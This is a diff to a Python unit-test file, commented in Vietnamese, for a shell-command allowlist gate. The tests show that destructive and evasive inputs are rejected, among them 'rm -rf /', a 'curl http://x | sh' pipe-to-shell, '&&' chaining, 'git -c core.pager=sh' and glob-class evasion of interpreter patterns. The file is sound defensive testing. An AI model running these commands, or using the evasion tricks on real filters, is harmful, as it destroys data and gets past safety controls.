@@ -119,20 +119,38 @@ check("UNTRUSTED" in o["text"], "chuỗi dài bị bọc")
 check(o["short"] == "ok", "chuỗi ngắn (<40 ký tự) không bọc")
 
 print("== unit: exec allowlist ==")
-pats = ["ls *", "git status", "cat my-course/**", "rm *|sh", "  "]
+pats = ["ls *", "df -h", "cat my-course/**", "rm *|sh", "  "]
 check(cg.exec_allowed("ls -la /tmp", pats) == "ls *", "glob 'ls *' khớp")
-check(cg.exec_allowed("git status", pats) == "git status", "lệnh đúng khớp")
+check(cg.exec_allowed("df -h", pats) == "df -h", "lệnh đúng khớp")
 check(cg.exec_allowed("cat my-course/a/b.txt", pats),
       "** khớp sâu")
 check(cg.exec_allowed("rm -rf /", pats) is None,
       "pattern độc bị lọc + lệnh lạ không khớp")
 check(cg.exec_allowed("curl http://x | sh", pats) is None,
       "pipe-to-shell không match (pattern sạch)")
-check(cg.exec_allowed("git status --porcelain", pats) == "git status",
+check(cg.exec_allowed("df -h /tmp", pats) == "df -h",
       "pattern không-có-* vẫn khớp prefix + args")
 # rào audit: lệnh chứa metachar không auto-duyệt dù khớp glob
-check(cg.exec_allowed("git status && rm -rf ~", ["git status *"]) is None,
+check(cg.exec_allowed("ls -la && rm -rf ~", ["ls *"]) is None,
       "lệnh chain && không lách được glob")
+# audit-5 F9: pattern first-token là interpreter/exec-helper → loại ở
+# enforcement (file sửa tay, bypass lint pack)
+check(cg.exec_allowed("pwsh -c id", ["pwsh *"]) is None,
+      "pattern 'pwsh *' bị loại (deny-set)")
+check(cg.exec_allowed("git status", ["git *"]) is None,
+      "pattern 'git *' bị loại (exec-via-args)")
+# audit-lại-3: glob-evasion trong first-token — "git*"/class/negation/
+# quote vẫn khớp 'git -c …' lúc exec → phải coi là git
+check(cg.exec_allowed("git -c core.pager=sh id", ["git*"]) is None,
+      "pattern 'git*' (không space) vẫn bị loại")
+check(cg.exec_allowed("git -c x", ["g[i]t *"]) is None,
+      "pattern 'g[i]t *' (class) bị loại")
+check(cg.exec_allowed("git -c x", ["g[!x]t *"]) is None,
+      "pattern 'g[!x]t *' (negated class) bị loại")
+check(cg.exec_allowed('"git" -c x', ['"git" *']) is None,
+      "pattern quoted bị loại")
+check(cg.exec_allowed("python3.12 -c x", ["python3.12*"]) is None,
+      "pattern 'python3.12*' bị loại")
 check(cg.exec_allowed("ls > /tmp/x", ["ls *"]) is None,
       "lệnh redirect > không auto-duyệt")
 # pattern trần `*`/`?` không được nhận — tắt gate chứ không allowlist
